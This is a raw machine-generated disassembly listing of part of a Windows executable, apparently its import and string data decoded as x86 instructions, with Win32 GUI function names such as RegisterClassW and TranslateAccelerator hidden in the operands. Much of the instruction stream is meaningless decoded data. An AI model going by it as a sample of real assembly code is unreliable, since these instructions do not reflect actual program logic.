  4123a5:	cmp    BYTE PTR [ecx],al
  4123a7:	add    BYTE PTR [eax+edi*1],dh
  4123aa:	add    DWORD PTR [eax],eax
  4123ac:	dec    edx
  4123ad:	cmp    BYTE PTR [ecx],al
  4123af:	add    BYTE PTR [eax+edi*1+0x1],bl
  4123b3:	add    BYTE PTR [eax+edi*1+0x1],ch
  4123b7:	add    BYTE PTR [eax+edi*1+0x389a0001],al
  4123be:	add    DWORD PTR [eax],eax
  4123c0:	stos   BYTE PTR es:[edi],al
  4123c1:	cmp    BYTE PTR [ecx],al
  4123c3:	add    BYTE PTR [esi-0x35fffec8],dh
  4123c9:	cmp    BYTE PTR [ecx],al
  4123cb:	add    dh,bl
  4123cd:	cmp    BYTE PTR [ecx],al
  4123cf:	add    dh,ch
  4123d1:	cmp    BYTE PTR [ecx],al
  4123d3:	add    dh,bh
  4123d5:	cmp    BYTE PTR [ecx],al
  4123d7:	add    BYTE PTR [esi],cl
  4123d9:	cmp    DWORD PTR [ecx],eax
  4123db:	add    BYTE PTR [ecx+edi*1],bl
  4123de:	add    DWORD PTR [eax],eax
  4123e0:	sub    bh,BYTE PTR [ecx]
  4123e2:	add    DWORD PTR [eax],eax
  4123e4:	cmp    BYTE PTR [ecx],bh
  4123e6:	add    DWORD PTR [eax],eax
  4123e8:	inc    esp
  4123e9:	cmp    DWORD PTR [ecx],eax
  4123eb:	add    BYTE PTR [eax+0x39],bl
  4123ee:	add    DWORD PTR [eax],eax
  4123f0:	cmp    DWORD PTR fs:[ecx],eax
  4123f3:	add    BYTE PTR [ecx+edi*1+0x1],dh
  4123f7:	add    BYTE PTR [esi+0x39],bh
  4123fa:	add    DWORD PTR [eax],eax
  4123fc:	xchg   esp,eax
  4123fd:	cmp    DWORD PTR [ecx],eax
  4123ff:	add    BYTE PTR [esi-0x45fffec7],bl
  412405:	cmp    DWORD PTR [ecx],eax
  412407:	add    al,dl
  412409:	cmp    DWORD PTR [ecx],eax
  41240b:	add    al,ah
  41240d:	cmp    DWORD PTR [ecx],eax
  41240f:	add    al,dh
  412411:	cmp    DWORD PTR [ecx],eax
  412413:	add    ah,bh
  412415:	cmp    DWORD PTR [ecx],eax
  412417:	add    BYTE PTR [eax],cl
  412419:	cmp    al,BYTE PTR [ecx]
  41241b:	add    BYTE PTR [eax],al
  41241d:	add    BYTE PTR [eax],al
  41241f:	add    BYTE PTR [edx+edi*1],ah
  412422:	add    DWORD PTR [eax],eax
	...
  41242c:	jmp    0x0:0x4d49a9
  412433:	add    BYTE PTR [edx],al
  412435:	add    BYTE PTR [eax],al
  412437:	add    BYTE PTR [esi],bh
  412439:	add    BYTE PTR [eax],al
  41243b:	add    BYTE PTR [ecx-0x76fffcc8],cl
  412441:	sub    al,0x3
	...
  41244b:	add    dl,ch
  41244d:	test   eax,0x4d49
  412452:	add    BYTE PTR [eax],al
  412454:	jp     0x41247a
  412456:	add    DWORD PTR [eax],eax
  412458:	add    DWORD PTR [eax],eax
  41245a:	add    BYTE PTR [eax],al
  41245c:	add    DWORD PTR [eax],eax
  41245e:	add    BYTE PTR [eax],al
  412460:	add    DWORD PTR [eax],eax
  412462:	add    BYTE PTR [eax],al
  412464:	jo     0x41248a
  412466:	add    DWORD PTR [eax],eax
  412468:	je     0x41248e
  41246a:	add    DWORD PTR [eax],eax
  41246c:	js     0x412492
  41246e:	add    DWORD PTR [eax],eax
  412470:	je     0x4124bc
  412472:	add    BYTE PTR [eax],al
  412474:	mov    esp,DWORD PTR [ecx+eax*1]
  412477:	add    BYTE PTR [eax],al
  412479:	add    BYTE PTR [eax+0x48],cl
  41247c:	push   ebx
  41247d:	aaa    
  41247e:	inc    edi
  41247f:	inc    esi
  412480:	js     0x4124bb
  412482:	fs ja  0x4124b8
  412485:	data16 cs je 0x4124f8
  412489:	jo     0x41248b
  41248b:	aas    
  41248c:	inc    edi
  41248d:	outs   dx,BYTE PTR gs:[esi]
  41248f:	gs jb  0x4124f3
  412492:	je     0x4124f9
  412494:	push   ebx
  412495:	je     0x4124f8
  412497:	je     0x4124fe
  412499:	inc    eax
  41249a:	inc    eax
  41249b:	pop    ecx
  41249c:	inc    edi
  41249d:	push   eax
  41249e:	inc    ecx
  41249f:	dec    edx
  4124a0:	push   eax
  4124a1:	inc    ecx
  4124a2:	inc    esi
  4124a3:	dec    eax
  4124a4:	dec    ebp
  4124a5:	push   eax
  4124a6:	inc    ecx
  4124a7:	inc    esi
  4124a8:	cmp    al,0x56
	...
  4124b6:	add    BYTE PTR [eax],al
  4124b8:	pop    eax
  4124b9:	and    eax,0x1
  4124be:	add    BYTE PTR [eax],al
  4124c0:	add    BYTE PTR [eax],al
  4124c2:	add    BYTE PTR [eax],al
  4124c4:	enter  0x130,0x0
  4124c8:	add    BYTE PTR [eax],ah
  4124ca:	add    DWORD PTR [eax],eax
  4124cc:	adc    BYTE PTR [edi],ah
  4124ce:	add    DWORD PTR [eax],eax
	...
  4124d8:	pop    eax
  4124d9:	xor    al,0x1
  4124db:	add    BYTE PTR [eax-0x1ffffedf],bh
  4124e1:	daa    
  4124e2:	add    DWORD PTR [eax],eax
	...
  4124ec:	mov    al,ds:0x88000134
  4124f1:	and    al,BYTE PTR [ecx]
  4124f3:	add    ah,dh
  4124f5:	daa    
  4124f6:	add    DWORD PTR [eax],eax
	...
  412500:	pushf  
  412501:	add    DWORD PTR ss:[eax],eax
  412504:	pushf  
  412505:	and    al,BYTE PTR [ecx]
  412507:	add    BYTE PTR [eax+0x128],ch
  41250d:	add    BYTE PTR [eax],al
  41250f:	add    BYTE PTR [eax],al
  412511:	add    BYTE PTR [eax],al
  412513:	add    BYTE PTR [eax],bh
  412515:	aaa    
  412516:	add    DWORD PTR [eax],eax
  412518:	push   eax
  412519:	and    eax,DWORD PTR [ecx]
  41251b:	add    ah,al
  41251d:	sub    BYTE PTR [ecx],al
	...
  412527:	add    BYTE PTR [edx],bl
  412529:	cmp    al,BYTE PTR [ecx]
  41252b:	add    BYTE PTR [ebx+eiz*1+0x1],ch
  41252f:	add    BYTE PTR [eax+0x29],bh
  412532:	add    DWORD PTR [eax],eax
	...
  41253c:	cmp    bh,BYTE PTR [edx]
  41253e:	add    DWORD PTR [eax],eax
  412540:	and    BYTE PTR [ecx+eax*1],ah
	...
  412557:	add    BYTE PTR [eax-0x6dfffed7],al
  41255d:	sub    DWORD PTR [ecx],eax
  41255f:	add    BYTE PTR [edx-0x4ffffed7],ah
  412565:	sub    DWORD PTR [ecx],eax
  412567:	add    BYTE PTR [esi-0x2bfffed7],bh
  41256d:	sub    DWORD PTR [ecx],eax
  41256f:	add    ah,ah
  412571:	sub    DWORD PTR [ecx],eax
  412573:	add    dh,dh
  412575:	sub    DWORD PTR [ecx],eax
  412577:	add    BYTE PTR [edx],al
  412579:	sub    al,BYTE PTR [ecx]
  41257b:	add    BYTE PTR [edx+ebp*1],dl
  41257e:	add    DWORD PTR [eax],eax
  412580:	and    BYTE PTR [edx],ch
  412582:	add    DWORD PTR [eax],eax
  412584:	sub    al,BYTE PTR cs:[ecx]
  412587:	add    BYTE PTR [esi+0x2a],al
  41258a:	add    DWORD PTR [eax],eax
  41258c:	pop    eax
  41258d:	sub    al,BYTE PTR [ecx]
  41258f:	add    BYTE PTR [esi+0x2a],ah
  412592:	add    DWORD PTR [eax],eax
  412594:	js     0x4125c0
  412596:	add    DWORD PTR [eax],eax
  412598:	mov    gs,WORD PTR [edx]
  41259a:	add    DWORD PTR [eax],eax
  41259c:	sahf   
  41259d:	sub    al,BYTE PTR [ecx]
  41259f:	add    BYTE PTR [edx-0x35fffed6],dh
  4125a5:	sub    al,BYTE PTR [ecx]
  4125a7:	add    dh,bl
  4125a9:	sub    al,BYTE PTR [ecx]
  4125ab:	add    dl,ch
  4125ad:	sub    al,BYTE PTR [ecx]
  4125af:	add    ah,bh
  4125b1:	sub    al,BYTE PTR [ecx]
  4125b3:	add    BYTE PTR [edx],dl
  4125b5:	sub    eax,DWORD PTR [ecx]
  4125b7:	add    BYTE PTR [esi],bl
  4125b9:	sub    eax,DWORD PTR [ecx]
  4125bb:	add    BYTE PTR [ebx+ebp*1],ch
  4125be:	add    DWORD PTR [eax],eax
  4125c0:	inc    eax
  4125c1:	sub    eax,DWORD PTR [ecx]
  4125c3:	add    BYTE PTR [esi+0x2b],cl
  4125c6:	add    DWORD PTR [eax],eax
  4125c8:	sub    eax,DWORD PTR fs:[ecx]
  4125cb:	add    BYTE PTR [edx+0x2b],dh
  4125ce:	add    DWORD PTR [eax],eax
  4125d0:	test   BYTE PTR [ebx],ch
  4125d2:	add    DWORD PTR [eax],eax
  4125d4:	mov    gs,WORD PTR [ebx]
  4125d6:	add    DWORD PTR [eax],eax
  4125d8:	sahf   
  4125d9:	sub    eax,DWORD PTR [ecx]
  4125db:	add    BYTE PTR [eax-0x3bfffed5],bh
  4125e1:	sub    eax,DWORD PTR [ecx]
  4125e3:	add    al,dl
  4125e5:	sub    eax,DWORD PTR [ecx]
  4125e7:	add    ah,ch
  4125e9:	sub    eax,DWORD PTR [ecx]
  4125eb:	add    ah,bh
  4125ed:	sub    eax,DWORD PTR [ecx]
  4125ef:	add    BYTE PTR [edx],cl
  4125f1:	sub    al,0x1
  4125f3:	add    BYTE PTR [eax],bl
  4125f5:	sub    al,0x1
  4125f7:	add    BYTE PTR [esp+ebp*1],ah
  4125fa:	add    DWORD PTR [eax],eax
  4125fc:	cmp    BYTE PTR [ecx+eax*1],ch
  4125ff:	add    BYTE PTR [esi+0x2c],cl
  412602:	add    DWORD PTR [eax],eax
  412604:	pop    edx
  412605:	sub    al,0x1
  412607:	add    BYTE PTR [edx+0x2c],ch
  41260a:	add    DWORD PTR [eax],eax
  41260c:	jl     0x41263a
  41260e:	add    DWORD PTR [eax],eax
  412610:	mov    gs,WORD PTR [ecx+eax*1]
  412613:	add    BYTE PTR [eax-0x47fffed4],ah
  412619:	sub    al,0x1
  41261b:	add    al,cl
  41261d:	sub    al,0x1
  41261f:	add    dh,dl
  412621:	sub    al,0x1
  412623:	add    ah,ah
  412625:	sub    al,0x1
  412627:	add    dh,dh
  412629:	sub    al,0x1
  41262b:	add    BYTE PTR [esi],al
  41262d:	sub    eax,0x2d140001
  412632:	add    DWORD PTR [eax],eax
  412634:	es sub eax,0x2d3c0001
  41263a:	add    DWORD PTR [eax],eax
  41263c:	dec    edx
  41263d:	sub    eax,0x2d5a0001
  412642:	add    DWORD PTR [eax],eax
  412644:	push   0x2d
  412646:	add    DWORD PTR [eax],eax
  412648:	je     0x412677
  41264a:	add    DWORD PTR [eax],eax
  41264c:	test   BYTE PTR ds:0x2d900001,ch
  412652:	add    DWORD PTR [eax],eax
  412654:	sahf   
  412655:	sub    eax,0x2daa0001
  41265a:	add    DWORD PTR [eax],eax
  41265c:	mov    eax,0xd000012d
  412661:	sub    eax,0x2dde0001
  412666:	add    DWORD PTR [eax],eax
  412668:	out    dx,al
  412669:	sub    eax,0x2dfe0001
  41266e:	add    DWORD PTR [eax],eax
  412670:	or     al,0x2e
  412672:	add    DWORD PTR [eax],eax
  412674:	push   ds
  412675:	add    DWORD PTR cs:[eax],eax
  412678:	xor    ch,BYTE PTR [esi]
  41267a:	add    DWORD PTR [eax],eax
  41267c:	dec    esi
  41267d:	add    DWORD PTR cs:[eax],eax
  412680:	pop    esi
  412681:	add    DWORD PTR cs:[eax],eax
  412684:	je     0x4126b4
  412686:	add    DWORD PTR [eax],eax
  412688:	xchg   BYTE PTR [esi],ch
  41268a:	add    DWORD PTR [eax],eax
  41268c:	call   0x12e:0xac00012e
  412693:	add    BYTE PTR [esi-0x33fffed2],bh
  412699:	add    DWORD PTR cs:[eax],eax
  41269c:	fisubr DWORD PTR [esi]
  41269e:	add    DWORD PTR [eax],eax
  4126a0:	out    dx,al
  4126a1:	add    DWORD PTR cs:[eax],eax
  4126a4:	cli    
  4126a5:	add    DWORD PTR cs:[eax],eax
  4126a8:	push   cs
  4126a9:	das    
  4126aa:	add    DWORD PTR [eax],eax
  4126ac:	push   ds
  4126ad:	das    
  4126ae:	add    DWORD PTR [eax],eax
  4126b0:	cs das 
  4126b2:	add    DWORD PTR [eax],eax
  4126b4:	inc    eax
  4126b5:	das    
  4126b6:	add    DWORD PTR [eax],eax
  4126b8:	pop    eax
  4126b9:	das    
  4126ba:	add    DWORD PTR [eax],eax
  4126bc:	outs   dx,BYTE PTR ds:[esi]
  4126bd:	das    
  4126be:	add    DWORD PTR [eax],eax
  4126c0:	jle    0x4126f1
  4126c2:	add    DWORD PTR [eax],eax
  4126c4:	call   0x12f:0xae00012f
  4126cb:	add    BYTE PTR [edx-0x39fffed1],bh
  4126d1:	das    
  4126d2:	add    DWORD PTR [eax],eax
  4126d4:	aam    0x2f
  4126d6:	add    DWORD PTR [eax],eax
  4126d8:	in     al,0x2f
  4126da:	add    DWORD PTR [eax],eax
  4126dc:	cli    
  4126dd:	das    
  4126de:	add    DWORD PTR [eax],eax
  4126e0:	or     al,0x30
  4126e2:	add    DWORD PTR [eax],eax
  4126e4:	push   ss
  4126e5:	xor    BYTE PTR [ecx],al
  4126e7:	add    BYTE PTR [esi],ch
  4126e9:	xor    BYTE PTR [ecx],al
  4126eb:	add    BYTE PTR [edx],bh
  4126ed:	xor    BYTE PTR [ecx],al
  4126ef:	add    BYTE PTR [eax+esi*1+0x1],cl
  4126f3:	add    BYTE PTR [eax+0x30],bl
  4126f6:	add    DWORD PTR [eax],eax
  4126f8:	jb     0x41272a
  4126fa:	add    DWORD PTR [eax],eax
  4126fc:	jle    0x41272e
  4126fe:	add    DWORD PTR [eax],eax
  412700:	mov    WORD PTR [eax],?
  412702:	add    DWORD PTR [eax],eax
  412704:	mov    ds:0xb8000130,al
  412709:	xor    BYTE PTR [ecx],al
  41270b:	add    BYTE PTR [eax],al
  41270d:	add    BYTE PTR [eax],al
  41270f:	add    ah,dl
  412711:	xor    BYTE PTR [ecx],al
  412713:	add    al,ch
  412715:	xor    BYTE PTR [ecx],al
  412717:	add    BYTE PTR [eax],al
  412719:	xor    DWORD PTR [ecx],eax
  41271b:	add    BYTE PTR [esi],dl
  41271d:	xor    DWORD PTR [ecx],eax
  41271f:	add    BYTE PTR [esi],ah
  412721:	xor    DWORD PTR [ecx],eax
  412723:	add    BYTE PTR [ecx+esi*1],dh
  412726:	add    DWORD PTR [eax],eax
  412728:	dec    esp
  412729:	xor    DWORD PTR [ecx],eax
  41272b:	add    BYTE PTR [edx+0x31],bl
  41272e:	add    DWORD PTR [eax],eax
  412730:	xor    WORD PTR [ecx],ax
  412733:	add    BYTE PTR [eax+0x31],bh
  412736:	add    DWORD PTR [eax],eax
  412738:	xchg   esp,eax
  412739:	xor    DWORD PTR [ecx],eax
  41273b:	add    BYTE PTR [edx-0x49fffecf],ah
  412741:	xor    DWORD PTR [ecx],eax
  412743:	add    dh,al
  412745:	xor    DWORD PTR [ecx],eax
  412747:	add    dl,dl
  412749:	xor    DWORD PTR [ecx],eax
  41274b:	add    ah,ah
  41274d:	xor    DWORD PTR [ecx],eax
  41274f:	add    ah,ch
  412751:	xor    DWORD PTR [ecx],eax
  412753:	add    ah,bh
  412755:	xor    DWORD PTR [ecx],eax
  412757:	add    BYTE PTR [esi],cl
  412759:	xor    al,BYTE PTR [ecx]
  41275b:	add    BYTE PTR [edx+esi*1],bl
  41275e:	add    DWORD PTR [eax],eax
  412760:	xor    al,BYTE PTR cs:[ecx]
  412763:	add    BYTE PTR [eax+0x32],al
  412766:	add    DWORD PTR [eax],eax
  412768:	push   esi
  412769:	xor    al,BYTE PTR [ecx]
  41276b:	add    BYTE PTR [esi+0x32],ah
  41276e:	add    DWORD PTR [eax],eax
  412770:	js     0x4127a4
  412772:	add    DWORD PTR [eax],eax
  412774:	mov    dh,BYTE PTR [edx]
  412776:	add    DWORD PTR [eax],eax
  412778:	call   0x132:0xb0000132
  41277f:	add    al,al
  412781:	xor    al,BYTE PTR [ecx]
  412783:	add    ah,cl
  412785:	xor    al,BYTE PTR [ecx]
  412787:	add    dl,ah
  412789:	xor    al,BYTE PTR [ecx]
  41278b:	add    ah,dh
  41278d:	xor    al,BYTE PTR [ecx]
  41278f:	add    BYTE PTR [esi],al
  412791:	xor    eax,DWORD PTR [ecx]
  412793:	add    BYTE PTR [esi],dl
  412795:	xor    eax,DWORD PTR [ecx]
  412797:	add    BYTE PTR [ebx+esi*1],ch
  41279a:	add    DWORD PTR [eax],eax
  41279c:	cmp    dh,BYTE PTR [ebx]
  41279e:	add    DWORD PTR [eax],eax
  4127a0:	push   eax
  4127a1:	xor    eax,DWORD PTR [ecx]
  4127a3:	add    BYTE PTR [ebx+esi*1+0x1],ah
  4127a7:	add    BYTE PTR [edx+0x33],bh
  4127aa:	add    DWORD PTR [eax],eax
  4127ac:	cwde   
  4127ad:	xor    eax,DWORD PTR [ecx]
  4127af:	add    BYTE PTR [eax-0x43fffecd],dh
  4127b5:	xor    eax,DWORD PTR [ecx]
  4127b7:	add    dh,cl
  4127b9:	xor    eax,DWORD PTR [ecx]
  4127bb:	add    dl,bl
  4127bd:	xor    eax,DWORD PTR [ecx]
  4127bf:	add    dh,ch
  4127c1:	xor    eax,DWORD PTR [ecx]
  4127c3:	add    BYTE PTR [esi],al
  4127c5:	xor    al,0x1
  4127c7:	add    BYTE PTR [edx],dl
  4127c9:	xor    al,0x1
  4127cb:	add    BYTE PTR [eax],ah
  4127cd:	xor    al,0x1
  4127cf:	add    BYTE PTR [edx],dh
  4127d1:	xor    al,0x1
  4127d3:	add    BYTE PTR [edx+0x34],al
  4127d6:	add    DWORD PTR [eax],eax
  4127d8:	dec    esp
  4127d9:	xor    al,0x1
  4127db:	add    BYTE PTR [eax],al
  4127dd:	add    BYTE PTR [eax],al
  4127df:	add    BYTE PTR [esi+0x34],ah
  4127e2:	add    DWORD PTR [eax],eax
  4127e4:	je     0x41281a
  4127e6:	add    DWORD PTR [eax],eax
  4127e8:	xor    BYTE PTR [ecx+eax*1],0x0
  4127ec:	xchg   esp,eax
  4127ed:	xor    al,0x1
  4127ef:	add    BYTE PTR [eax],al
  4127f1:	add    BYTE PTR [eax],al
  4127f3:	add    BYTE PTR [esi-0x43fffecc],ch
  4127f9:	xor    al,0x1
  4127fb:	add    dh,cl
  4127fd:	xor    al,0x1
  4127ff:	add    ah,bl
  412801:	xor    al,0x1
  412803:	add    ah,ah
  412805:	xor    al,0x1
  412807:	add    ah,dh
  412809:	xor    al,0x1
  41280b:	add    BYTE PTR [eax],al
  41280d:	xor    eax,0x350e0001
  412812:	add    DWORD PTR [eax],eax
  412814:	push   ss
  412815:	xor    eax,0x35220001
  41281a:	add    DWORD PTR [eax],eax
  41281c:	sub    al,0x35
  41281e:	add    DWORD PTR [eax],eax
  412820:	ss xor eax,0x353e0001
  412826:	add    DWORD PTR [eax],eax
  412828:	dec    eax
  412829:	xor    eax,0x35520001
  41282e:	add    DWORD PTR [eax],eax
  412830:	pop    esp
  412831:	xor    eax,0x35680001
  412836:	add    DWORD PTR [eax],eax
  412838:	je     0x41286f
  41283a:	add    DWORD PTR [eax],eax
  41283c:	jle    0x412873
  41283e:	add    DWORD PTR [eax],eax
  412840:	mov    BYTE PTR ds:0x35920001,dh
  412846:	add    DWORD PTR [eax],eax
  412848:	mov    al,ds:0xa8000135
  41284d:	xor    eax,0x35b40001
  412852:	add    DWORD PTR [eax],eax
  412854:	mov    esi,0xc8000135
  412859:	xor    eax,0x35d20001
  41285e:	add    DWORD PTR [eax],eax
  412860:	fidiv  WORD PTR ds:0x35ec0001
  412866:	add    DWORD PTR [eax],eax
  412868:	clc    
  412869:	xor    eax,0x36000001
  41286e:	add    DWORD PTR [eax],eax
  412870:	or     al,0x36
  412872:	add    DWORD PTR [eax],eax
  412874:	push   ss
  412875:	add    DWORD PTR ss:[eax],eax
  412878:	and    BYTE PTR [esi],dh
  41287a:	add    DWORD PTR [eax],eax
  41287c:	sub    BYTE PTR [esi],dh
  41287e:	add    DWORD PTR [eax],eax
  412880:	xor    dh,BYTE PTR [esi]
  412882:	add    DWORD PTR [eax],eax
  412884:	cmp    al,0x36
  412886:	add    DWORD PTR [eax],eax
  412888:	inc    esi
  412889:	add    DWORD PTR ss:[eax],eax
  41288c:	push   eax
  41288d:	add    DWORD PTR ss:[eax],eax
  412890:	pop    edx
  412891:	add    DWORD PTR ss:[eax],eax
  412894:	fs add DWORD PTR ss:[eax],eax
  412898:	outs   dx,BYTE PTR ds:[esi]
  412899:	add    DWORD PTR ss:[eax],eax
  41289c:	xor    BYTE PTR [esi],0x1
  41289f:	add    BYTE PTR [edx+0x136],dl
  4128a5:	add    BYTE PTR [eax],al
  4128a7:	add    BYTE PTR [eax-0x3ffffeca],ch
  4128ad:	add    DWORD PTR ss:[eax],eax
  4128b0:	fdiv   DWORD PTR [esi]
  4128b2:	add    DWORD PTR [eax],eax
  4128b4:	hlt    
  4128b5:	add    DWORD PTR ss:[eax],eax
  4128b8:	or     al,0x37
  4128ba:	add    DWORD PTR [eax],eax
  4128bc:	and    al,0x37
  4128be:	add    DWORD PTR [eax],eax
  4128c0:	add    BYTE PTR [eax],al
  4128c2:	add    BYTE PTR [eax],al
  4128c4:	inc    esi
  4128c5:	aaa    
  4128c6:	add    DWORD PTR [eax],eax
  4128c8:	pop    esp
  4128c9:	aaa    
  4128ca:	add    DWORD PTR [eax],eax
  4128cc:	jo     0x412905
  4128ce:	add    DWORD PTR [eax],eax
  4128d0:	jle    0x412909
  4128d2:	add    DWORD PTR [eax],eax
  4128d4:	mov    dh,BYTE PTR [edi]
  4128d6:	add    DWORD PTR [eax],eax
  4128d8:	cwde   
  4128d9:	aaa    
  4128da:	add    DWORD PTR [eax],eax
  4128dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4128dd:	aaa    
  4128de:	add    DWORD PTR [eax],eax
  4128e0:	mov    ah,0x37
  4128e2:	add    DWORD PTR [eax],eax
  4128e4:	les    esi,FWORD PTR [edi]
  4128e6:	add    DWORD PTR [eax],eax
  4128e8:	into   
  4128e9:	aaa    
  4128ea:	add    DWORD PTR [eax],eax
  4128ec:	fidiv  DWORD PTR [edi]
  4128ee:	add    DWORD PTR [eax],eax
  4128f0:	repnz aaa 
  4128f2:	add    DWORD PTR [eax],eax
  4128f4:	push   es
  4128f5:	cmp    BYTE PTR [ecx],al
  4128f7:	add    BYTE PTR [eax],bl
  4128f9:	cmp    BYTE PTR [ecx],al
  4128fb:	add    BYTE PTR [eax],ch
  4128fd:	cmp    BYTE PTR [ecx],al
  4128ff:	add    BYTE PTR [eax+edi*1],dh
  412902:	add    DWORD PTR [eax],eax
  412904:	dec    edx
  412905:	cmp    BYTE PTR [ecx],al
  412907:	add    BYTE PTR [eax+edi*1+0x1],bl
  41290b:	add    BYTE PTR [eax+edi*1+0x1],ch
  41290f:	add    BYTE PTR [eax+edi*1+0x389a0001],al
  412916:	add    DWORD PTR [eax],eax
  412918:	stos   BYTE PTR es:[edi],al
  412919:	cmp    BYTE PTR [ecx],al
  41291b:	add    BYTE PTR [esi-0x35fffec8],dh
  412921:	cmp    BYTE PTR [ecx],al
  412923:	add    dh,bl
  412925:	cmp    BYTE PTR [ecx],al
  412927:	add    dh,ch
  412929:	cmp    BYTE PTR [ecx],al
  41292b:	add    dh,bh
  41292d:	cmp    BYTE PTR [ecx],al
  41292f:	add    BYTE PTR [esi],cl
  412931:	cmp    DWORD PTR [ecx],eax
  412933:	add    BYTE PTR [ecx+edi*1],bl
  412936:	add    DWORD PTR [eax],eax
  412938:	sub    bh,BYTE PTR [ecx]
  41293a:	add    DWORD PTR [eax],eax
  41293c:	cmp    BYTE PTR [ecx],bh
  41293e:	add    DWORD PTR [eax],eax
  412940:	inc    esp
  412941:	cmp    DWORD PTR [ecx],eax
  412943:	add    BYTE PTR [eax+0x39],bl
  412946:	add    DWORD PTR [eax],eax
  412948:	cmp    DWORD PTR fs:[ecx],eax
  41294b:	add    BYTE PTR [ecx+edi*1+0x1],dh
  41294f:	add    BYTE PTR [esi+0x39],bh
  412952:	add    DWORD PTR [eax],eax
  412954:	xchg   esp,eax
  412955:	cmp    DWORD PTR [ecx],eax
  412957:	add    BYTE PTR [esi-0x45fffec7],bl
  41295d:	cmp    DWORD PTR [ecx],eax
  41295f:	add    al,dl
  412961:	cmp    DWORD PTR [ecx],eax
  412963:	add    al,ah
  412965:	cmp    DWORD PTR [ecx],eax
  412967:	add    al,dh
  412969:	cmp    DWORD PTR [ecx],eax
  41296b:	add    ah,bh
  41296d:	cmp    DWORD PTR [ecx],eax
  41296f:	add    BYTE PTR [eax],cl
  412971:	cmp    al,BYTE PTR [ecx]
  412973:	add    BYTE PTR [eax],al
  412975:	add    BYTE PTR [eax],al
  412977:	add    BYTE PTR [edx+edi*1],ah
  41297a:	add    DWORD PTR [eax],eax
  41297c:	add    BYTE PTR [eax],al
  41297e:	add    BYTE PTR [eax],al
  412980:	add    eax,0x67655202
  412985:	imul   esi,DWORD PTR [ebx+0x74],0x6c437265
  41298c:	popa   
  41298d:	jae    0x412a02
  41298f:	push   edi
  412990:	add    BYTE PTR [eax],al
  412992:	push   ebp
  412993:	add    DWORD PTR [edi+0x65],eax
  412996:	je     0x4129eb
  412998:	arpl   WORD PTR [edx+0x6f],si
  41299b:	ins    BYTE PTR es:[edi],dx
  41299c:	ins    BYTE PTR es:[edi],dx
  41299d:	push   eax
  41299e:	outs   dx,DWORD PTR ds:[esi]
  41299f:	jae    0x4129a1
  4129a1:	add    BYTE PTR [ecx+0x616f4c01],ch
  4129a7:	fs inc edx
  4129a9:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x44004170
  4129b1:	add    BYTE PTR [ebx+0x6c],al
  4129b4:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  4129bb:	jb     0x4129bd
  4129bd:	add    BYTE PTR [edx+0x2],cl
  4129c0:	push   ebx
  4129c1:	gs je  0x412a11
  4129c4:	outs   dx,BYTE PTR gs:[esi]
  4129c6:	jne    0x412a0c
  4129c8:	gs popaw 
  4129cb:	jne    0x412a39
  4129cd:	je     0x412a18
  4129cf:	je     0x412a36
  4129d1:	ins    DWORD PTR es:[edi],dx
  4129d2:	add    BYTE PTR [eax],al
  4129d4:	pop    edi
  4129d5:	add    dl,BYTE PTR [ebx+0x65]
  4129d8:	je     0x412a2d
  4129da:	jns    0x412a4f
  4129dc:	inc    ebx
  4129dd:	outs   dx,DWORD PTR ds:[esi]
  4129de:	ins    BYTE PTR es:[edi],dx
  4129df:	outs   dx,DWORD PTR ds:[esi]
  4129e0:	jb     0x412a55
  4129e2:	add    BYTE PTR [eax],al
  4129e4:	mov    ds:0x57734901,eax
  4129e9:	imul   ebp,DWORD PTR [esi+0x64],0x6956776f
  4129f0:	jae    0x412a5b
  4129f2:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  4129f6:	push   0x74654701
  4129fb:	push   edi
  4129fc:	imul   ebp,DWORD PTR [esi+0x64],0xa100776f
  412a03:	add    DWORD PTR [ecx+0x73],ecx
  412a06:	push   edi
  412a07:	imul   ebp,DWORD PTR [esi+0x64],0x6e45776f
  412a0e:	popa   
  412a0f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  412a13:	add    al,ch
  412a15:	add    DWORD PTR [edi+0x70],ecx
  412a18:	outs   dx,BYTE PTR gs:[esi]
  412a1a:	dec    ecx
  412a1b:	arpl   WORD PTR [edi+0x6e],bp
  412a1e:	add    BYTE PTR [eax],al
  412a20:	stos   DWORD PTR es:[edi],eax
  412a21:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  412a25:	fs inc ebx
  412a27:	jne    0x412a9b
  412a29:	jae    0x412a9a
  412a2b:	jb     0x412a6e
  412a2d:	add    BYTE PTR [edx+eax*1+0x6e617254],dl
  412a34:	jae    0x412aa2
  412a36:	popa   
  412a37:	je     0x412a9e
  412a39:	inc    ecx
  412a3a:	arpl   WORD PTR [ebx+0x65],sp
  412a3d:	ins    BYTE PTR es:[edi],dx
  412a3e:	gs jb  0x412aa2
  412a41:	je     0x412ab2
  412a43:	jb     0x412a9c
  412a45:	add    BYTE PTR [ecx+0x0],ah
  412a48:	inc    ebx
  412a49:	jb     0x412ab0
  412a4b:	popa   
  412a4c:	je     0x412ab3
  412a4e:	push   eax
  412a4f:	outs   dx,DWORD PTR ds:[esi]
  412a50:	jo     0x412ac7
  412a52:	jo     0x412aa1
  412a54:	outs   dx,BYTE PTR gs:[esi]
  412a56:	jne    0x412a58
  412a58:	add    BYTE PTR ss:[ebx+0x68],al
  412a5c:	popa   
  412a5d:	jb     0x412ab4
  412a5f:	jo     0x412ad1
  412a61:	gs jb  0x412aa5
  412a64:	add    BYTE PTR [eax],al
  412a66:	mov    ds:0x57734901,al
  412a6b:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  412a72:	imul   esp,DWORD PTR [ebx+0x6f],0x3b006564
  412a79:	add    DWORD PTR [edi+0x65],eax
  412a7c:	je     0x412acb
  412a7e:	gs jae 0x412af4
  412a81:	popa   
  412a82:	addr16 gs inc ebp
  412a85:	js     0x412afb
  412a87:	jb     0x412aea
  412a89:	dec    ecx
  412a8a:	outs   dx,BYTE PTR ds:[esi]
  412a8b:	outs   dx,WORD PTR ds:[esi]
  412a8d:	add    BYTE PTR [esi+0x0],al
  412a90:	inc    ebx
  412a91:	ins    BYTE PTR es:[edi],dx
  412a92:	outs   dx,DWORD PTR ds:[esi]
  412a93:	jae    0x412afa
  412a95:	inc    esp
  412a96:	gs jae 0x412b04
  412a99:	je     0x412b0a
  412a9b:	jo     0x412a9d
  412a9d:	add    cl,ch
  412a9f:	add    DWORD PTR [edi+0x70],ecx
  412aa2:	outs   dx,BYTE PTR gs:[esi]
